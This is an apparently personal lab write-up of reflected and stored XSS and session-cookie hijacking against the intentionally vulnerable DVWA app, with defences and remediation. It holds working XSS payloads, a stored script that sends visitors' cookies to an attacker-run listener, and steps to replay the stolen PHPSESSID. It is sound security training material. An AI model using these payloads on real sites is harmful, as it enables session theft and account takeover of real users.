# 🔴 Web Attack Write-Up: XSS & Cookie Hijacking on DVWA

**Author:** Anush  
**Date:** March 19, 2026  
**Difficulty:** Beginner  
**Target:** DVWA (Damn Vulnerable Web Application) v1.0.7  
**Attacker Machine:** Kali Linux  
**Lab:** Local VirtualBox Environment  
**Result:** ✅ Session Cookie Stolen — Logged In Without Password

---

## ⚠️ Legal Disclaimer

> All attacks were performed in a **private, isolated lab environment** using Oracle VirtualBox.  
> DVWA is an **intentionally vulnerable web application** built specifically for security training.  
> **Never perform these techniques on any website you do not own or have explicit written permission to test.**  
> Unauthorised computer access is illegal in Australia under the Cybercrime Act 2001.

---

## 📋 Table of Contents

1. [Lab Setup](#️-lab-setup)
2. [What is XSS](#-what-is-xss)
3. [What is a Cookie](#-what-is-a-cookie)
4. [Attack 1 — Reflected XSS](#-attack-1--reflected-xss)
5. [Attack 2 — Stored XSS](#-attack-2--stored-xss)
6. [Attack 3 — Cookie Hijacking via XSS](#-attack-3--cookie-hijacking-via-xss)
7. [What I Learned](#-what-i-learned)
8. [Real World Relevance](#-real-world-relevance)

---

## 🖥️ Lab Setup

| Component | Details |
|---|---|
| Virtualisation Platform | Oracle VirtualBox |
| Attacker Machine | Kali Linux (10.0.2.15) |
| Target Machine | DVWA — Ubuntu 32-bit (10.0.2.7) |
| Network Type | NAT Network (isolated) |
| DVWA Version | v1.0.7 |
| Security Level | Low |

### Network Diagram

```
Your Ubuntu computer
└── VirtualBox (NAT Network)
    ├── Kali Linux  (10.0.2.15) ← attacker
    └── DVWA        (10.0.2.7)  ← target website
```

---

## 🎯 What is XSS

XSS stands for **Cross Site Scripting.**

### Simple Story

Imagine a school notice board where students leave messages.

```
Normal student:
Writes: "Anush was here"
Teacher reads it → displays it normally
Nothing weird happens

Sneaky hacker student:
Writes: "Ring the fire alarm"
School reads it → ACTUALLY rings the fire alarm
Chaos happens
```

That is XSS. The website is supposed to just **display** what you type. Instead it **runs** it as code.

### In Website Language

```
Normal person types:   Anush
Website shows:         Hello Anush

Hacker types:          <script>alert('HACKED')</script>
Website runs it:       A popup appears saying HACKED
```

The website could not tell the difference between normal text and code. It ran everything blindly. That is the bug.

### Two Types of XSS

```
Reflected XSS → only affects the person who sent it
                like a poisoned letter sent to one person

Stored XSS    → saved in database permanently
                affects EVERY person who visits the page
                much more dangerous
```

---

## 🍪 What is a Cookie

Before attacking, understand what we are stealing.

### Simple Story

```
You go to a cinema
Security checks your ticket
Gives you a WRISTBAND
Now you walk in and out freely
Security just checks wristband
Never checks ticket again
```

A website cookie works exactly the same:

```
You log in with username and password
Website says "okay I trust you"
Gives your browser a SECRET WRISTBAND (cookie)
Now every page you visit
Website just checks your wristband
Never asks for password again
```

### What The Cookie Looks Like

```
PHPSESSID = ekt7p5vkk3t7bk3u50tmro4933
```

That random string = your wristband = proof you are logged in.

### Why Stealing It Is Dangerous

```
Hacker steals your cookie
Hacker pastes it into their browser
Website sees the wristband
Thinks hacker IS you
Gives hacker full access
No password needed
Victim has no idea
```

---

## ⚔️ Attack 1 — Reflected XSS

### Step 1 — Open DVWA and Login

```
URL:      http://10.0.2.7/login.php
Username: admin
Password: password
```

### Step 2 — Set Security To Low

```
Click DVWA Security in left menu
Select: Low
Click Submit
```

### Step 3 — Go To XSS Reflected

```
Click XSS reflected in left menu
```

You see a simple text box:

```
What's your name? [        ] [Submit]
```

### Step 4 — Test Normal Input First

Type:
```
Anush
```

Result: `Hello Anush` — normal, nothing weird.

### 📸 Screenshot

> *[INSERT SCREENSHOT — normal name input showing Hello Anush]*

---

### Step 5 — Inject The XSS Payload

Clear the box and type exactly:

```
<script>alert('You have been hacked')</script>
```

Click Submit.

### Result

A popup appears saying:
```
You have been hacked
```

### 📸 Screenshot

> *[INSERT SCREENSHOT — XSS popup appearing on screen]*

### What Just Happened

```
You typed:   <script>alert('hacked')</script>
Website did: Hello <script>alert('hacked')</script>
Browser saw: Oh there is a script tag → run it
Popup appeared
```

The website never checked what you typed. It pasted everything directly into the page and the browser executed it.

---

## ⚔️ Attack 2 — Stored XSS

This is the dangerous version. The code gets saved permanently in the database.

### Step 1 — Go To XSS Stored

```
Click XSS stored in left menu
```

You see a guestbook — anyone can leave messages and everyone who visits sees them all.

### Step 2 — Test Normal Input

```
Name:    Anush
Message: Hello this is my first message
```

Click Sign Guestbook. Message appears normally.

### Step 3 — Increase The Message Character Limit

The message box has a limit of 50 characters. Our attack script is longer so we need to remove this limit.

```
Right click inside Message box
Click Inspect Element
Find: maxlength="50"
Change 50 to 500
Press Enter
```

### Why This Works

```
maxlength is a browser-side restriction only
It lives in the HTML code
Server does not enforce it
Changing it in inspector removes the limit instantly
```

### Step 4 — Inject The Stored XSS

```
Name:    Hacker

Message: <script>alert('Everyone who visits gets hacked')</script>
```

Click Sign Guestbook.

### Result

Popup appears. BUT this time it is saved in the database. Every single person who visits this page from now on gets that popup — forever — until the database is reset.

### 📸 Screenshot

> *[INSERT SCREENSHOT — Stored XSS guestbook with script in message box]*

### Difference From Reflected

```
Reflected XSS:
You submit → only you get the popup → done

Stored XSS:
You submit → script saved in database
           → visitor 1 gets popup
           → visitor 2 gets popup
           → visitor 1000 gets popup
           → ALL without knowing anything happened
```

---

## ⚔️ Attack 3 — Cookie Hijacking via XSS

This is where XSS becomes truly dangerous. Instead of showing a popup — we steal the victim's session cookie and use it to log in as them.

### The Attack Plan

```
Step 1 → Start a cookie catcher on Kali (our mailbox)
Step 2 → Inject XSS code that sends cookie to our mailbox
Step 3 → Victim visits the page → cookie sent automatically
Step 4 → We use stolen cookie to log in as victim
```

---

### Step 1 — Start The Cookie Catcher

Open terminal on Kali and run:

```bash
cd /tmp && python3 -m http.server 8888
```

Output:
```
Serving HTTP on 0.0.0.0 port 8888
```

**What this does:**
```
Opens a letterbox on port 8888
Sits and waits
Any cookie sent to it will appear here
```

Leave this terminal running.

### 📸 Screenshot

> *[INSERT SCREENSHOT — python server running showing Serving HTTP on port 8888]*

---

### Step 2 — Inject The Cookie Stealing Script

Go to DVWA → XSS Stored.

First increase maxlength to 500 as before (right click → Inspect Element → change maxlength).

Fill in the boxes:

```
Name:    Hacker

Message: <script>document.location='http://10.0.2.15:8888/?cookie='+document.cookie</script>
```

Click Sign Guestbook.

**What this script says in plain English:**

```
<script>              → hey browser run this code
document.location=    → go to this web address
http://10.0.2.15:8888 → my Kali machine mailbox
/?cookie=             → and bring this with you
document.cookie       → the visitor's cookie
</script>             → end of code
```

---

### Step 3 — Cookie Arrives In Your Mailbox

Go back to the terminal running the python server.

You will see:

```
10.0.2.7 - - "GET /?cookie=PHPSESSID=ekt7p5vkk3t7bk3u50tmro4933;%20security=low HTTP/1.1" 200
```

**The stolen cookie is:**
```
PHPSESSID=ekt7p5vkk3t7bk3u50tmro4933
```

### 📸 Screenshot

> *[INSERT SCREENSHOT — terminal showing GET request with stolen PHPSESSID cookie arriving]*

---

### Step 4 — Use The Stolen Cookie To Log In Without Password

Open a **private browsing window:**

```
Press Ctrl + Shift + N
Go to: http://10.0.2.7/index.php
```

Open developer tools:

```
Press Ctrl + Shift + I
Click Storage tab
Click Cookies on left
Click http://10.0.2.7
```

Find **PHPSESSID** row. Double click the Value column next to it.

Type the stolen cookie:

```
ekt7p5vkk3t7bk3u50tmro4933
```

Press Enter. Then press F5 to refresh.

### 📸 Screenshot

> *[INSERT SCREENSHOT — Developer tools showing PHPSESSID value being changed]*

---

### Result — Logged In Without Any Password ✅

The page loads and you are inside DVWA as admin.

```
No username typed ✅
No password typed ✅
Private window — no saved credentials ✅
Logged in using ONLY the stolen cookie ✅
```

### 📸 Screenshot

> *[INSERT SCREENSHOT — DVWA home page loaded in private window without any login — this is your proof]*

---

## 📚 What I Learned

### Technical Skills Demonstrated

| Skill | Tool Used |
|---|---|
| Reflected XSS injection | Browser |
| Stored XSS injection | Browser + Inspector |
| Bypassing client-side input limits | Browser Inspector |
| Cookie stealing via XSS | JavaScript + Python server |
| Session hijacking | Browser Developer Tools |
| Cookie manipulation | Firefox Storage Inspector |

### Key Concepts Understood

**XSS** — Websites that display user input without sanitising it will execute any JavaScript injected by an attacker. The browser cannot tell the difference between legitimate code and injected code.

**Reflected vs Stored** — Reflected XSS affects only the person who sends it. Stored XSS is saved permanently in the database and affects every visitor.

**Session Cookies** — After login, websites give browsers a session cookie instead of asking for the password on every page. Stealing this cookie means stealing the identity.

**Cookie Hijacking** — Using a stolen session cookie to impersonate a victim. The website has no way to know the cookie is being used by a different person.

**Client-side vs Server-side validation** — The maxlength restriction only existed in the browser HTML. The server had no limit. Real security must always be enforced on the server side.

**Same Origin Policy** — To steal a Facebook cookie you need XSS ON Facebook. Cookies only work on the website that issued them. A script on evil.com cannot read Facebook cookies.

**HTTPOnly flag** — Modern websites protect cookies by setting HTTPOnly=true. This prevents JavaScript from reading cookies even if XSS exists. DVWA had HTTPOnly=false which is why our attack worked.

---

## 🛡️ How To Defend Against XSS

| Defence | What It Does |
|---|---|
| Input sanitisation | Strip or encode special characters like `<` `>` `"` before displaying |
| Content Security Policy | Tells browser which scripts are allowed to run |
| HTTPOnly cookie flag | Prevents JavaScript from reading cookies |
| Output encoding | Convert `<script>` to `&lt;script&gt;` so it displays as text not code |
| Web Application Firewall | Detects and blocks XSS payloads |

---

## 🌍 Real World Relevance

XSS has been responsible for some of the most famous web attacks in history.

**British Airways 2018** — XSS-style attack on their payment page stole credit card details of 500,000 customers. Fine: £20 million.

**Samy Worm 2005** — A stored XSS worm on MySpace spread to one million profiles in under 20 hours. Largest XSS attack in history.

**Real pentest report for this finding:**

```
Finding:     High — Stored Cross Site Scripting (XSS)
Location:    DVWA Guestbook — Message field
Impact:      Session hijacking, credential theft,
             malware distribution to all visitors
Proof:       PHPSESSID stolen and used to bypass authentication
Remediation: Sanitise all user input before storing
             Implement Content Security Policy
             Set HTTPOnly flag on all session cookies
             Implement server-side input length validation
```

**Salary range for roles using these skills in Australia:**

| Role | Salary (AUD) |
|---|---|
| Web Application Penetration Tester | $85,000 — $120,000 |
| Bug Bounty Hunter | $500 — $30,000 per bug |
| Application Security Engineer | $100,000 — $150,000 |

---

## 🔗 References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Top 10 — A03 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [PortSwigger XSS Learning](https://portswigger.net/web-security/cross-site-scripting)
- [DVWA Documentation](https://dvwa.co.uk)

---

## 👤 About The Author

This write-up was completed as part of a self-directed ethical hacking and penetration testing study program.

**Completed exploits and attacks so far:**
- Metasploitable 2 — vsftpd 2.3.4 backdoor (root shell)
- Metasploitable 2 — Samba usermap_script (reverse shell)
- Metasploitable 2 — SSH brute force with Hydra
- Windows 7 — EternalBlue MS17-010 (SYSTEM shell)
- DVWA — Reflected XSS ← this write-up
- DVWA — Stored XSS ← this write-up
- DVWA — Cookie Hijacking via XSS ← this write-up

**Lab environment:** Oracle VirtualBox — Kali Linux + DVWA + Metasploitable 2 + Windows 7  
**Currently studying:** CompTIA Security+ SY0-701, TryHackMe, OverTheWire Bandit  
**Next attack:** SQL Injection on DVWA

---

*This write-up is for educational purposes only. All testing was performed in an isolated lab environment. No real systems were involved.*
